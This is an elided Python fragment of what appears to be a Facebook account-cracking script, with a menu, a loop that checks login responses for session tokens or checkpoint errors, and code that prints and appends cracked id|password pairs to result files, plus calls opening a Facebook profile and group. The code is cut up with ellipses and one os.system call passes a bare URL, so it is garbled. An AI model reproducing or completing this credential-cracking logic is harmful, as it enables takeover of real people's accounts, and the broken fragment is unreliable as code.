...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.Facebook.com/musa.khan39545")
		exit()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [ANOX-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [ANOX-ok] %s|%s        '%(h,idf,pw))
...
if __name__=='__main__':
	...
	os.system("xdg-open https://facebook.com/groups/302389557457473/")
	menu()
